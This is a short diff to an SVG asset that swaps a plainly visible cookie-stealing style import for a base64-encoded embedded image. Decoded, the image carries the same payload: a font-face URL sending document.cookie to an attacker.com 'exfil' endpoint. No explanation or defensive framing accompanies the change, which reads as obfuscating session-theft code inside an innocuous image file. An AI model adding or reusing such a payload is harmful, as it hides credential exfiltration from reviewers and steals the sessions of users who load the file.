@@ -1,5 +1,3 @@
-<svg xmlns="http://www.w3.org/2000/svg">
-  <style>
-    @import url('https://attacker.com/exfil?data='+encodeURIComponent(document.cookie));
-  </style>
+<svg>
+  <image href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzdHlsZT5AZm9udC1mYWNle2ZvbnQtZmFtaWx5Oidmb28nO3NyYzp1cmwoJ2h0dHBzOi8vYXR0YWNrZXIuY29tL2V4ZmlsP2RhdGE9Jytlc2NhcGUoZG9jdW1lbnQuY29va2llKSk7fTwvc3R5bGU+PC9zdmc+"/>
 </svg>
